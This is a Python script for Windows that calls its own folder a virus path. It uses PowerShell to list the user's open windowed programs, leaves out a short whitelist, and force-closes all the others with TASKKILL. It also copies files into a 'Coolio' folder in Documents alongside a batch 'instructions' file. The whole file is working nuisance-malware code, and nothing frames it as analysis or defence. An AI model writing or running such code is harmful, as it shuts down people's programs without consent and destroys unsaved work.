# Libraries
import subprocess, time, os, shutil

# CONSTANTS
DESKTOP = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
DOCUMENTS = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
DOWNLOAD_PATH = DESKTOP + "/Coolio"
VIRUS_PATH = DOCUMENTS + "/Coolio"
INSTRUCTIONS_PATH = VIRUS_PATH + "/instructions.BAT"

# VARIABLES
Check = ['Code', 'ApplicationFrameHost', 'HxOutlook', 'Music.UI', 'SystemSettings', 'TextInputHost', 'python']

# FUNCTIONS

# Checks if items from "Check" list are in "Running Programs"
# And Deletes them if they are
def Check_Item_In_List(List, Check):
    
    # For each item in Check
    for i in range(len(Check)):
        
        # If List contains item from Check
        if Check[i] in List:
            
            # Remove said item
            List.remove(Check[i])

# Gets a list of ALL running processes
def Get_Running_Processes(Kill_List):
    
    # Gets Powershell Commands
    cmd = 'powershell "gps | where {$_.MainWindowTitle } | select Name'
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    
    # Executes Powershell Commands
    for line in proc.stdout:
        
        # Responsible for Reading powershell commands
        readCheck = line.decode()[0].isspace()
        read = line.decode().rstrip()
        
        # If there's no spaces
        if not readCheck:
            
            # Add running items to list
            Kill_List.append(read)
    
    # Removes "Description" and "----" seperators
    Kill_List.remove(Kill_List[0])
    Kill_List.remove(Kill_List[0])
    
    Check_Item_In_List(Kill_List, Check)

def Close_Programs(Hitlist):
    
    try:
        
        for a in range(len(Hitlist)):
            
            os.system('TASKKILL /F /IM ' + Hitlist[a] + '.exe')
    
    except Exception as e:
        print(str(e))

# Waits for __ Seconds
def Cool_Down(seconds):
    
    time.sleep(seconds)

# Moves file from A to B
def Move_File(source, destination):
    
    new_path = shutil.copy(source, destination)
    print(new_path)